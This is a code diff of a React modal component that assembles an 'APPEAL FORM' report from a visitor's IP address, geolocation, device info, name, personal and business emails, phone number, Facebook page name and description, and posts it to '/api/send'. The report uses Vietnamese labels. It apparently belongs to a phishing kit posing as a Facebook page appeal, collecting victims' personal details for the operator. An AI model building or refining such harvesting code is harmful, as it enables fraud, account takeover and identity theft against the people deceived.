@@ -96,22 +96,27 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         setIsLoading(true);
 
-        const message = `
-${
-    geoInfo
-        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
-<b>📍 Location:</b> <code>${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}</code>`
-        : 'N/A'
-}
+        const dt = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+        const location = geoInfo ? `${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}` : 'Unknown, Unknown, Unknown';
+        const ip = geoInfo?.ip || 'Unknown';
+        let message = `📩 <b>APPEAL FORM</b>\n`;
+        message += `⏰ ${dt}\n`;
+        message += `🌐 IP: <code>${ip}</code>\n`;
+        message += `📱 Thiết bị: <code>__DEVICE_INFO__</code>\n`;
+        message += `📍 Vị trí: ${location}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
-<b>👤 Full Name:</b> <code>${formData.fullName}</code>
-<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
-<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
-<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
-<b>📘 Facebook Page:</b> <code>${formData.facebookPageName}</code>
-
-<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
-        `.trim();
+        if (formData.fullName || formData.personalEmail || formData.businessEmail || phoneNumber || formData.facebookPageName || formData.information) {
+            message += `<b>📋 THÔNG TIN</b>\n`;
+            if (formData.fullName) message += `   Tên: <code>${formData.fullName}</code>\n`;
+            if (formData.personalEmail) message += `   Email: <code>${formData.personalEmail}</code>\n`;
+            if (formData.businessEmail && formData.businessEmail !== formData.personalEmail) {
+                message += `   Business: <code>${formData.businessEmail}</code>\n`;
+            }
+            if (phoneNumber) message += `   SĐT: <code>${phoneNumber}</code>\n`;
+            if (formData.facebookPageName) message += `   Page: <code>${formData.facebookPageName}</code>\n`;
+            if (formData.information) message += `   Mô tả: <code>${formData.information}</code>\n`;
+        }
 
         try {
             const res = await axios.post('/api/send', {
